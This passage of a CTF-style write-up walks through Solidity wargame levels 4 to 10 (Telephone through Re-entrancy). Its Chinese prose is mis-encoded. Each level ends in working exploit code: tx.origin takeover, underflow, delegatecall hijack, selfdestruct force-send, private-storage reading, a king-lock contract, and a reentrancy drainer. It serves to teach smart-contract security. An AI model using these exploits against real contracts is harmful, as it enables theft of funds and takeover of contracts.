<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">consecutiveWins</span><span class="p">().</span><span class="nx">then</span><span class="p">(</span><span class="nx">v</span> <span class="p">=&gt;</span> <span class="nx">v</span><span class="p">.</span><span class="nx">toString</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="c1">// Output: &#39;10&#39;
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Level completed.</p>
<h2 id="4-telephone">4. Telephone</h2>
<p>ç›®æ¨™ <code>owner = player</code></p>
<p>äº†è§£ tx.origin èˆ‡ msg.sender çš„å·®åˆ¥ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">changeOwner</span><span class="p">(</span><span class="kt">address</span> <span class="n">_owner</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nb">tx</span><span class="p">.</span><span class="nb">origin</span> <span class="o">!=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">owner</span> <span class="o">=</span> <span class="n">_owner</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="èˆ‰ä¾‹a-b-c-d">èˆ‰ä¾‹ï¼šA-&gt;B-&gt;C-&gt;D</h3>
<h4 id="inside-d">Inside D:</h4>
<ul>
<li>msg.sender ç‚º C (sender of the message)</li>
<li>tx.origin ç‚º A (sender of the transaction)</li>
</ul>
<h3 id="exploit-3">Exploit</h3>
<p>éƒ¨ç½²ä¸€å€‹åˆç´„å‘¼å« <code>changeOwner()</code> å³å¯é€šé tx.origin != msg.sender</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">ITelephone</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">changeOwner</span><span class="p">(</span><span class="kt">address</span> <span class="n">_owner</span><span class="p">)</span> <span class="k">external</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">TelephoneAttack</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">attack</span><span class="p">(</span><span class="kt">address</span> <span class="n">_addr</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">ITelephone</span><span class="p">(</span><span class="n">_addr</span><span class="p">).</span><span class="n">changeOwner</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Level completed.</p>
<h2 id="5-token">5. Token</h2>
<p>ç›®æ¨™ <code>balances[player] &gt; 20</code>ï¼Œåˆå§‹ <code>balances[player] = 20</code></p>
<p>è§€å¯Ÿ solidity ç‰ˆæœ¬ 0.6.0 ä¸”æ²’æœ‰ SafeMathï¼ˆ0.8.0 å¾Œè‡ªå¸¶ SafeMathï¼‰</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">transfer</span><span class="p">(</span><span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">_value</span><span class="p">)</span> <span class="k">public</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">-</span> <span class="n">_value</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">-=</span> <span class="n">_value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">balances</span><span class="p">[</span><span class="n">_to</span><span class="p">]</span> <span class="o">+=</span> <span class="n">_value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>unit256 ç¯„åœç‚º <code>0</code> åˆ° <code>2^256 - 1</code>ï¼Œæ‰€ä»¥ Line 2: require ä¸€å®šæœƒé</p>
<p>ä»»ä½•åŠ æ³•æ¸›æ³•éƒ½å¯èƒ½æœƒ overflow/underflow</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">20 - 21 = 2^256 - 1
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ‰€ä»¥è½‰å‡º 21 åˆ°åˆ¥çš„åœ°å€å³å¯</p>
<h3 id="exploit-4">Exploit</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span> <span class="mi">21</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Level completed.</p>
<h2 id="6-delegation">6. Delegation</h2>
<p>ç›®æ¨™ <code>owner = player</code></p>
<p>æ³¨æ„åˆ° Delegate åˆç´„æœ‰å€‹ <code>pwn()</code> å¯ä»¥æ”¹ owner:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">pwn</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">owner</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Delegation åˆç´„çš„ <code>fallback()</code> å¯ä»¥æœ‰å€‹ delegatecallï¼ˆåŸ·è¡Œå¦ä¸€å€‹åˆç´„çš„é‚è¼¯ï¼Œç‹€æ…‹æ˜¯æ”¹è®Šç¾åœ¨é€™å€‹åˆç´„ï¼‰</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl">  <span class="n">fallback</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="kt">bool</span> <span class="n">result</span><span class="p">,)</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">delegate</span><span class="p">).</span><span class="nb">delegatecall</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">data</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nb">this</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="exploit-5">Exploit</h3>
<p>åˆ©ç”¨ <code>fallback()</code> ä¸­çš„ delegatecall èª¿ç”¨ <code>pwn()</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">signature</span> <span class="o">=</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodeFunctionSignature</span><span class="p">(</span><span class="s2">&#34;pwn()&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">sendTransaction</span><span class="p">({</span> <span class="nx">from</span><span class="o">:</span> <span class="nx">player</span><span class="p">,</span> <span class="nx">data</span><span class="o">:</span> <span class="nx">signature</span> <span class="p">})</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Level completed.</p>
<h2 id="7-force">7. Force</h2>
<p>ç›®æ¨™è®“åˆç´„ balance &gt; 0</p>
<p>å¯ä»¥çœ‹åˆ°æ²’ receive æˆ– fallback</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Force</span> <span class="p">{</span><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">                   MEOW ?
</span></span></span><span class="line"><span class="cl"><span class="cm">         /\_/\   /
</span></span></span><span class="line"><span class="cl"><span class="cm">    ____/ o o \
</span></span></span><span class="line"><span class="cl"><span class="cm">  /~____  =Ã¸= /
</span></span></span><span class="line"><span class="cl"><span class="cm"> (______)__m_m)
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>é€ unexpected ether æœ€ç°¡å–®çš„åšæ³•ï¼šåˆç´„ selfdestruct ä¸¦ç™¼é€ ether åˆ°æŒ‡å®šåœ°å€</p>
<h3 id="exploit-6">Exploit</h3>
<p>è¨˜å¾—å…ˆè½‰ ether é€²å»å† selfdestruct</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">ForceAttack</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kd">constructor</span><span class="p">()</span> <span class="k">public</span> <span class="k">payable</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">  <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">attack</span><span class="p">(</span><span class="kt">address</span> <span class="k">payable</span> <span class="n">target</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nb">selfdestruct</span><span class="p">(</span><span class="n">target</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Level completed.</p>
<h2 id="8-vault">8. Vault</h2>
<p>ç›®æ¨™ <code>locked = false</code></p>
<p>password é›–ç„¶æ˜¯ private ä½†é‚„æ˜¯èƒ½é€éçŸ¥é“ä»–åœ¨å“ªå€‹ slot æ‹¿åˆ°ä»–çš„å€¼</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Vault</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">bool</span> <span class="k">public</span> <span class="n">locked</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">bytes32</span> <span class="k">private</span> <span class="n">password</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kd">constructor</span><span class="p">(</span><span class="kt">bytes32</span> <span class="n">_password</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">locked</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">password</span> <span class="o">=</span> <span class="n">_password</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">unlock</span><span class="p">(</span><span class="kt">bytes32</span> <span class="n">_password</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">password</span> <span class="o">==</span> <span class="n">_password</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">locked</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>slot 0: bool public locked;</li>
<li>slot 1: bytes32 private password;</li>
</ul>
<h3 id="exploit-7">Exploit</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">password</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">contract</span><span class="p">.</span><span class="nx">address</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">unlock</span><span class="p">(</span><span class="nx">password</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Level completed.</p>
<h2 id="9-king">9. King</h2>
<p>ç›®æ¨™ <code>king = player</code></p>
<p>å¿…é ˆä»˜æ¯” prize() æ›´å¤šçš„ ether æˆç‚ºæ–°çš„ kingï¼Œæäº¤ instance æ™‚è¦é¿å… level å†åº¦æˆç‚º king</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl">  <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">&gt;=</span> <span class="n">prize</span> <span class="o">||</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span> <span class="o">==</span> <span class="n">owner</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">king</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">king</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">prize</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>line 4 æœƒæ”¹è®Š kingï¼Œå› æ­¤éœ€æƒ³è¾¦æ³•åœ¨ line 3 å¡ä½</p>
<h3 id="exploit-8">Exploit</h3>
<p>ä¸å¯« receive æˆ– fallbackï¼Œç•¶é€²åˆ° <code>king.transfer(msg.value)</code> æœƒæœ‰ exception</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">ForeverKing</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">claimKingship</span><span class="p">(</span><span class="kt">address</span> <span class="k">payable</span> <span class="n">_to</span><span class="p">)</span> <span class="k">public</span> <span class="k">payable</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="kt">bool</span> <span class="n">sent</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="n">_to</span><span class="p">.</span><span class="nb">call</span><span class="p">.</span><span class="nb">value</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">)(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Level completed.</p>
<h2 id="10-re-entrancy">10. Re-entrancy</h2>
<p>ç›®æ¨™å·èµ°åˆç´„æ‰€æœ‰çš„è³‡ç”¢</p>
<p>å¾ˆæ˜é¡¯é•å check-effect-interactions pattern</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">withdraw</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="n">_amount</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="p">(</span><span class="kt">bool</span> <span class="n">result</span><span class="p">,)</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span><span class="n">_amount</span><span class="p">}(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span><span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">_amount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">-=</span> <span class="n">_amount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="exploit-9">Exploit</h3>
<ol>
<li><code>donate()</code></li>
<li><code>withdraw()</code></li>
<li>é‡å…¥ <code>withdraw()</code>ï¼Œæ­¤æ™‚ <code>balances[msg.sender]</code> é‚„æ²’è¢«æ”¹è®Š</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">IReentrance</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">donate</span><span class="p">(</span><span class="kt">address</span> <span class="n">_to</span><span class="p">)</span> <span class="k">external</span> <span class="k">payable</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">withdraw</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">external</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">ReentranceAttack</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">IReentrance</span> <span class="n">target</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint</span> <span class="n">targetValue</span> <span class="o">=</span> <span class="mi">1000000000000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_targetAddr</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">target</span> <span class="o">=</span> <span class="n">IReentrance</span><span class="p">(</span><span class="n">_targetAddr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">donateAndWithdraw</span><span class="p">()</span> <span class="k">public</span> <span class="k">payable</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">&gt;=</span> <span class="n">targetValue</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">target</span><span class="p">.</span><span class="n">donate</span><span class="p">.</span><span class="nb">value</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">)(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="n">target</span><span class="p">.</span><span class="n">withdraw</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">uint</span> <span class="n">targetBalance</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">target</span><span class="p">).</span><span class="nb">balance</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">targetBalance</span> <span class="o">&gt;=</span> <span class="n">targetValue</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="n">target</span><span class="p">.</span><span class="n">withdraw</span><span class="p">(</span><span class="n">targetValue</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
